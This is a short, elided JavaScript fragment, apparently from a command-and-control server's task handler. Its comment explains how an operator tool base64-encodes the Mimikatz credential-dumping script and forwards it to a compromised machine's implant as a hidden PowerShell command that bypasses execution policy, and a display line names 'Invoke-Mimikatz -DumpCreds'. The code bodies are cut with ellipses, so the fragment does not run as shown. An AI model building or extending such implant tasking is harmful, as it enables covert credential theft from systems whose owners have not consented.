// Invoke-Mimikatz Task Handler
// The operator CLI reads Invoke-Mimikatz.ps1, appends the invocation, UTF-16LE base64
// encodes the script, and stores the full 'powershell -w hidden -ep bypass -EncodedCommand <b64>'
// string as the 'command' parameter. TaskHandler forwards it to the implant as an os_shell task.
export class TaskHandler {
  ...
  getTask = async function (req, res) {
    ...
    const display      = `PS: Invoke-Mimikatz -DumpCreds`
